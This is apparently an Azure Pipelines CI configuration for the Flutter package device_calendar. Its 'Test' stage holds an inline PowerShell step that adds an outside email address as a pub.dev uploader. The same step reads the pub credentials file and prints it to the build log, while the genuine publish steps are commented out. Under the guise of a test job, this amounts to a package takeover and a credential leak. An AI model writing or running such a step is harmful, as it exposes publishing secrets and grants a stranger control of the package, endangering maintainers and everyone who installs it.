variables:
  # The $(FlutterToolPath) variable is generated by the FlutterInstall task 
  # See code in the Flutter Build task https://github.com/aloisdeniel/vsts-flutter-tasks/blob/master/tasks/build/index.ts
  flutterExecPath: $(FlutterToolPath)/flutter.bat
  versionNumberRegex: '(?<=version: ).*'

trigger:
  batch: 'true'
  branches:
    include:
      - develop
      - release
      - hotfix
      - master
  paths:
    include:
      - device_calendar/*

stages:
  - stage: Test
    jobs:
     - job: TestJob
       pool:
        vmImage: 'windows-latest'
       steps:
        - task: FlutterInstall@0
          displayName: 'Flutter install'
          inputs:
            channel: 'stable'
            version: 'latest'

        - task: PowerShell@2
          inputs:
            targetType: 'inline'
            script: |
              $(flutterExecPath) pub uploader add lhh0900@gmail.com

              [string] $test = Get-Content -Path "~/.pub-cache/credentials.json" -Raw

              Write-Host $test

        # - task: CmdLine@2
        #   displayName: 'Dry run publish'
        #   inputs:
        #     workingDirectory: '$(Build.SourcesDirectory)/device_calendar'
        #     script: '$(flutterExecPath) pub publish --dry-run'

        # - task: CmdLine@2
        #   displayName: 'Publish'
        #   inputs:
        #     workingDirectory: '$(Build.SourcesDirectory)/device_calendar'
        #     script: '$(flutterExecPath) pub publish --force'